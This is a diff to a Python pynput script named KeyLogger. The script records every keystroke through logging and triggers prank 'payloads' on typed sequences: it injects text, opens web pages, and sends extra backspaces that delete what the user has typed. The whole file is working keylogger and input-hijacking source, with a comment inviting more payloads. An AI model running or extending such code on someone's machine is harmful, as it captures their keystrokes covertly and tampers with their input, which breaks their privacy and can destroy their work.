@@ -1,5 +1,5 @@
 from pynput.keyboard import Key, Listener, Controller
-import logging, os, webbrowser
+import logging, os, webbrowser, time
 
 
 class KeyLogger:
@@ -12,13 +12,21 @@ class KeyLogger:
 
         self.coolList = []
 
+        self.a = 0
+        self.b = 5
+
     def on_press(self, key):
         logging.info(key)
-        if key == Key.backspace:
+        if key == Key.backspace and self.b > self.a:
+            self.b -= 1
+            self.event_delete(True)
+        if key == Key.backspace and len(self.coolList) > 0:
             self.coolList.pop()
         if key != Key.caps_lock and key != Key.shift and key != Key.backspace:
             self.coolList.append(str(key).lower())
             self.check()
+            self.a = 0
+            self.b = 5
 
     def run(self):
         with Listener(on_press=self.on_press) as listener:
@@ -35,6 +43,10 @@ class KeyLogger:
         if self.event_what():
             return
         if self.event_texas_is_back():
+            return
+        if self.event_famous_quotes():
+            return
+        if self.event_delete():
             return
         # New payload goes here...
 
@@ -72,7 +84,7 @@ class KeyLogger:
                     keyboard.press('/')
                 with keyboard.pressed(Key.shift):
                     keyboard.press('/')
-                return
+                return True
         return False
 
     def event_texas_is_back(self):
@@ -80,7 +92,54 @@ class KeyLogger:
         event_texas_is_back = ["'t'", "'e'", "'x'", "'a'", "'s'"]
         if checkList == event_texas_is_back:
             webbrowser.open('www.espn.com/college-football/rankings')
+            return True
+        return False
+
+    def event_famous_quotes(self):
+        checkList = self.coolList[-5:]
+        event_tobe = ["'t'", "'o'", 'key.space', "'b'", "'e'"]
+        if checkList == event_tobe:
+            keyboard = Controller()
+            keyboard.type(', or not to-be, that is the question')
+            return True
+
+        checkList = self.coolList[-3:]
+        event_get_off_my_lawn = ["'g'", "'e'", "'t'"]
+        if checkList == event_get_off_my_lawn:
+            webbrowser.open('https://www.youtube.com/watch?v=z7X2_V60YK8')
+            return True
+        return False
+
+    def event_delete(self, backspace=False):
+        if backspace == True:
+            keyboard = Controller()
+            keyboard.press(Key.backspace)
+            time.sleep(0.01)
             return
+        
+        checkList = self.coolList[-4:]
+        event_back = ["'b'", "'a'", "'c'", "'k'"]
+        if checkList == event_back:
+            keyboard = Controller()
+            keyboard.press(Key.backspace)
+            time.sleep(0.1)
+            keyboard.press(Key.backspace)
+            time.sleep(0.1)
+            keyboard.press(Key.backspace)
+            time.sleep(0.1)
+            keyboard.press(Key.backspace)
+            return True
+
+        checkList = self.coolList[-3:]
+        event_del = ["'d'", "'e'", "'l'"]
+        if checkList == event_del:
+            keyboard = Controller()
+            keyboard.press(Key.backspace)
+            time.sleep(0.1)
+            keyboard.press(Key.backspace)
+            time.sleep(0.1)
+            keyboard.press(Key.backspace)
+            return True
         return False
 
 def main():
@@ -89,3 +148,19 @@ def main():
 
 if __name__ == '__main__':
     main()
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
